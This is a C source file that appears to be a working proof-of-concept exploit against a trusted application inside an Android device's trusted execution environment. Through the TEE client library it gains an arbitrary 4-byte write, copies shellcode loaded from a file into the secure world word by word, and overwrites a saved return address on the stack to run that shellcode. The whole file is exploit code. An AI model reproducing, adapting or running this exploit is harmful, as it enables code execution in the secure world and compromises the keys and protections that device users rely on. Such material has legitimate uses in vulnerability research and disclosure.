#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include <dlfcn.h>
#include <sys/mman.h>

#define FUN_000097EC_RIP_STACK_ADDR 0x80007d5c
#define FUN_000097EC_R6_ADDR 0x80007d54
#define PARAMS_ARRAY_BASE_ADDR 0x80007e00
#define PARAMS_ARRAY_PARAMS_0_BUF_ADDR 0x80007e00
#define PARAMS_ARRAY_PARAMS_1_BUF_ADDR 0x80007e08
#define PARAMS_ARRAY_PARAMS_2_BUF_ADDR 0x80007e10
#define PARAMS_ARRAY_PARAMS_3_BUF_ADDR 0x80007e18

#define FIRST_BUF_BASE_ADDR 0x818028
#define SECOND_BUF_BASE_ADDR 0x819028
#define THIRD_BUF_BASE_ADDR 0x81a028
#define FOURTH_BUF_BASE_ADDR 0x81b028

#define SHELLCODE_BASE_ADDR 0x5fe0 // 0x35ff00 jumping to shellcode placed here makes TA hang
#define SHELLCODE_PATH "/data/local/tmp/shellcode.bin"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
              TEEC_Session*, const TEEC_UUID*, uint32_t, const void*,
              TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
void (*TEEC_ReleaseSharedMemory_impl)(TEEC_SharedMemory*);


void errx(int error_code, char* msg) {
  if (error_code != 0)  {
    printf("Error: %#x\n", error_code);
    printf("%s\n", msg);
    abort();
  }
}

void hexdump(char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char *)addr;

    // Output description if given.
    if (desc != NULL)
        printf("%s:\n", desc);

    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %i\n", len);
        return;
    }
    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf("  %s\n", buff);

            // Output the offset.
            printf("  %04x ", i);
        }
        // Now the hex code for the specific character.
        printf(" %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }

    // And print the final ASCII bit.
    printf("  %s\n", buff);
}

void hex2bytes(char* in, unsigned char* out){
    for (size_t count = 0; count < 32; count++) {
        sscanf(in, "%2hhx", &out[count]);
        in += 2;
    }
    return;
}

int s2uuid(char* ta_name, TEEC_UUID* uuid) {

  unsigned char hex_b[0x40] = { 0 };
  hex2bytes(ta_name, hex_b);

  uuid->timeLow = (uint32_t)hex_b[0] << 24 |
    (uint32_t)hex_b[1] << 16 |
    (uint32_t)hex_b[2] << 8  |
    (uint32_t)hex_b[3];
  uuid->timeMid = (uint16_t)hex_b[4] << 8 | (uint16_t)hex_b[5];
  uuid->timeHiAndVersion = (uint16_t)hex_b[6] << 8 | (uint16_t)hex_b[7];
  for(int i = 0; i<8; i++){
      uuid->clockSeqAndNode[i] = (uint8_t)hex_b[8+i];
  }

  return 0;
}

void load_functions()
{
    void *handle;
    char *error;
    handle = dlopen("/vendor/lib/libTEECommon.so", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "Failed to dlopen the library%s\n", dlerror());
        exit(EXIT_FAILURE);
    }
    dlerror(); // Clear any existing error
    TEEC_OpenSession_impl = dlsym(handle, "TEEC_OpenSession");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "Failed dlsym for TEEC_OpenSession: %s\n", error);
        exit(EXIT_FAILURE);
    }
    TEEC_InitializeContext_impl = dlsym(handle, "TEEC_InitializeContext");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "Failed dlsym for TEEC_InitializeContext: %s\n", error);
        exit(EXIT_FAILURE);
    }
    TEEC_InvokeCommand_impl = dlsym(handle, "TEEC_InvokeCommand");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "Failed dlsym for TEEC_InvokeCommand: %s\n", error);
        exit(EXIT_FAILURE);
    }
    TEEC_CloseSession_impl = dlsym(handle, "TEEC_CloseSession");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "Failed dlsym for TEEC_CloseSession: %s\n", error);
        exit(EXIT_FAILURE);
    }
    TEEC_FinalizeContext_impl = dlsym(handle, "TEEC_FinalizeContext");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "Failed dlsym for TEEC_FinalizeContext: %s\n", error);
        exit(EXIT_FAILURE);
    }
    TEEC_RegisterSharedMemory_impl = dlsym(handle, "TEEC_RegisterSharedMemory");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "Failed dlsym for TEEC_RegisterSharedMemory: %s\n", error);
        exit(EXIT_FAILURE);
    }
    TEEC_ReleaseSharedMemory_impl = dlsym(handle, "TEEC_ReleaseSharedMemory");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "Failed dlsym for TEEC_ReleaseSharedMemory: %s\n", error);
        exit(EXIT_FAILURE);
    }
}


void arb_write_4_bytes(uint32_t address, uint32_t value, TEEC_Context *context, TEEC_Session *session)
{
    TEEC_SharedMemory pInput;
    TEEC_Operation op;
    TEEC_Result res;
    uint32_t err_origin;

    char* mem_area = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    errx(mem_area == -1, "mmap failed");
    char* mem_out = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    errx(mem_out == -1, "mmap failed");
    char* mem_out2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    errx(mem_out2 == -1, "mmap failed");

    memset(mem_area, 0, 0x1000);
    memset(mem_out, 0, 0x1000);
    memset(mem_out2, 0, 0x1000);

    // header, `KBPM`, maybe checked in later versions
    mem_area[0] = 0x4B;
    mem_area[1] = 0x42;
    mem_area[2] = 0x50;
    mem_area[3] = 0x4D;

    ((uint32_t*) mem_area)[17] = 1; // keycount
    ((uint32_t*) mem_area)[18] = value; // value written to params[1].memref.buffer[0]

    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
                                     TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT);

    op.params[0].tmpref.buffer = mem_area;
    op.params[0].tmpref.size =  0x1000;

    op.params[1].value.a = address;
    op.params[1].value.b = 4;

    op.params[2].tmpref.buffer = mem_out;
    op.params[2].tmpref.size =  0x1000;

    op.params[3].tmpref.buffer = mem_out2;
    op.params[3].tmpref.size =  0x1000;

    res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);

    printf("\t overwrite return address at %#x, value: %#x\n", address, value);
    printf("\t ret: %#x :/\n", res);

    hexdump("mem_area", mem_area, 0x20);
    hexdump("mem_out", mem_out, 0x20);
    hexdump("mem_out2", mem_out2, 0x20);
}


void check_banner(uint32_t* sc_blob, uint32_t sc_sz)
{
    TEEC_Context context;
    TEEC_Session session;
    TEEC_UUID uuid = { 0 };
    uint32_t err_origin;
    TEEC_Result res;

    char* ta = "08110000000000000000000000000000";

    errx(s2uuid(ta, &uuid), "s2uuid failed");

    load_functions();

    // Initialize context
    errx(TEEC_InitializeContext_impl(NULL, &context),
          "TEEC_InitializeContext failed");

    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, &uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);

    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code %#x origin %#x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    int shellcode[128] = {0};
    int shell_i = 0;

    // printf("[+] Writing shellcode\n");
    for (int i = 0; i < sc_sz/4; i++) {
        // printf("[+] Round %d: %#x = %#x\n", i, SHELLCODE_BASE_ADDR + i*4, ((uint32_t*)sc_blob)[i]);
        arb_write_4_bytes(SHELLCODE_BASE_ADDR + i*4, ((uint32_t*)sc_blob)[i], &context, &session);
    }

    // printf("[+] Jumping to shellcode at %#x using RIP on stack at %#x\n", SHELLCODE_BASE_ADDR + 1, FUN_000097EC_RIP_STACK_ADDR);
    // overwrite rip of FUN_000097EC
    arb_write_4_bytes(FUN_000097EC_RIP_STACK_ADDR, SHELLCODE_BASE_ADDR + 1, &context, &session);

    // Close session
    TEEC_CloseSession_impl(&session);
    // Finalize context
    TEEC_FinalizeContext_impl(&context);
}


int main(int argc, char **argv)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    printf("===========================================\n");
    printf("[!!] Arb write test\n");
    printf("===========================================\n");

    FILE* sc_f = fopen(SHELLCODE_PATH, "r");
    errx(sc_f == NULL, "fopen failed");
    errx(fseek(sc_f, 0, SEEK_END), "fseek failed");
    long sz = ftell(sc_f);
    errx(fseek(sc_f, 0, SEEK_SET), "fseek failed");
    char* sc_blob = calloc(1, sz);
    fread(sc_blob, 1, sz, sc_f);
    printf("Read %d bytes of shellcode\n", sz);

    check_banner(sc_blob, sz);

    printf("[+] End\n");

    return 0;
}
